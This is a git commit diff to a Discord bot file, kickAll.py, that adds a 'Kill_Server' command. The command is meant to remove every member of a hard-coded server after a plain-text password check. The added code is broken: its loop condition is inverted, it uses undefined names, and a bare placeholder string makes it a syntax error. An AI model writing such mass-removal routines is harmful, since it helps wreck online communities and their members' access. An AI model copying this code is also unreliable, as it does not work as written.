8296e7b15f1f21085ce3822438356dfb149506e8
souless2nd <36045871+souless2nd@users.noreply.github.com>
2020-02-12 12:30:37 -0500

    Update kickAll.py

--- kickAll.py
+++ kickAll.py
@@ -8,5 +8,12 @@ class events(commands.Cog):
         self.bot = bot
     @commands.Cog.Command()
     async def Kill_Server():
+        guild = bot.get_guild(547259564094128148)
+        password = input("Password to execute this: ")
+        while password != "1161600":
+            for members in guild:
+                ctx.send(PLACEHOLDER FOR INVITE LINK)
+                member.remove(member)
+
 def setup(bot):
     bot.add_cog(events(bot))
